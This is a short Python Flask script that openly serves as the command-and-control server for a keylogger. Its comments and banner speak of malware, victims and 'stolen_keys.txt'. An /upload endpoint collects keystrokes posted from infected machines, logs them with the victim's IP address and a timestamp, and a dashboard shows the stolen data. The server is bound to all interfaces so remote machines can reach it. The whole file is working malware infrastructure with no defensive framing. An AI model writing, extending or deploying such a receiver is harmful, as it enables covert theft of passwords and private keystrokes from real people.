import logging
from flask import Flask, request, render_template
import datetime
import os

# --- CONFIGURATION ---
# 1. Mute the default Flask logs so the terminal looks clean
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
LOG_FILE = "stolen_keys.txt"

print("==================================================")
print("   COMMAND CENTER ONLINE")
print("   Status: LISTENING")
print("   Waiting for targeted data from victim...")
print("==================================================")

# --- 1. RECEIVER (Listens for incoming data) ---
@app.route('/upload', methods=['POST'])
def receive_keys():
    # Receive the data sent by the malware
    data = request.form.get('keys') 
    ip_address = request.remote_addr
    
    if data:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        
        # Print to terminal in a clean format
        print(f"\n[+] RECEIVED ({timestamp}) from {ip_address}: {data}")
        
        # Save to file
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}|{ip_address}|{data}\n")
        return "Received", 200
    return "Error", 400

# --- 2. DASHBOARD (View the data in browser) ---
@app.route('/')
def home():
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            for line in reversed(lines):
                try:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        logs.append({
                            "time": parts[0],
                            "ip": parts[1],
                            "keys": parts[2]
                        })
                except:
                    continue
    return render_template('index.html', logs=logs)

if __name__ == '__main__':
    # host='0.0.0.0' allows connections from external laptops
    app.run(host='0.0.0.0', port=5000, debug=False)
